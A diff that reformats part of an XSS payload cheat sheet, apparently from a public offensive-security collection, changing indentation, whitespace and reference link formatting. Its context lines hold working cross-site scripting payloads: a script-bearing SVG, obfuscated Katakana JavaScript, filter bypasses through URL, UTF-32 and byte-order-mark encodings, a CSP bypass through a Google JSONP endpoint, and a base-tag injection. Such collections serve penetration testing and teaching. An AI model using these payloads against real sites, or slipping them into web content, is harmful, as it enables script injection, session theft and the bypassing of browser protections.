@@ -215,10 +215,10 @@ XSS in SVG
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-   <script type="text/javascript">
-      alert(document.domain);
-   </script>
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
 </svg>
 ```
 
@@ -530,12 +530,12 @@ document.appendChild(i);
 XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
       var proxy = obj[name];
       obj[name] = function () {
-         if (exec_original) {
-            return proxy.apply(this, arguments);
-         }
+        if (exec_original) {
+          return proxy.apply(this, arguments);
+        }
       };
       XSSObject.lockdown(obj, name);
-   };
+  };
 XSSObject.proxy(window, 'alert', 'window.alert', false);
 ```
 
@@ -571,7 +571,7 @@ Bypass using HTML encoding
 %26%2397;lert(1)
 ```
 
-Bypass using Katakana (https://github.com/aemkei/katakana.js)
+Bypass using [Katakana](https://github.com/aemkei/katakana.js)
 
 ```javascript
 javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
@@ -651,7 +651,7 @@ Bypass using UTF-32
 %00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-Bypass using BOM - Byte Order Mark (The page must begin with the BOM character.)    
+Bypass using BOM - Byte Order Mark (The page must begin with the BOM character.)
 BOM character allows you to override charset of the page
 
 ```js
@@ -666,11 +666,11 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))       
+Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 //google.com/complete/search?client=chrome&jsonp=alert(1);
 
 ```js
-<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"   
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
 ```
 
 Bypass using weird encoding or native interpretation to hide the payload (alert())
@@ -723,7 +723,7 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
 ```
 
-## More fun ?
+## More fun
 
 This section will be used for the "fun/interesting/useless" stuff.
 
@@ -743,9 +743,9 @@ Try here : [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php
 - [(Relative Path Overwrite) RPO XSS - Infinite Security](http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html)
 - [RPO TheSpanner](http://www.thespanner.co.uk/2014/03/21/rpo/)
 - [RPO Gadget - innerthmtl](http://blog.innerht.ml/rpo-gadgets/)
-- http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite
-- http://d3adend.org/xss/ghettoBypass
-- http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
-- http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html
-- https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5
-- https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309
+- [Relative Path Overwrite - Detectify](http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite)
+- [XSS ghettoBypass - d3adend](http://d3adend.org/xss/ghettoBypass)
+- [XSS without HTML: Client-Side Template Injection with AngularJS](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html)
+- [XSSING WEB PART - 2 - Rakesh Mane](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
+- [Making an XSS triggered by CSP bypass on Twitter. @tbmnull](https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5)
+- [Ways to alert(document.domain) - @tomnomnom](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
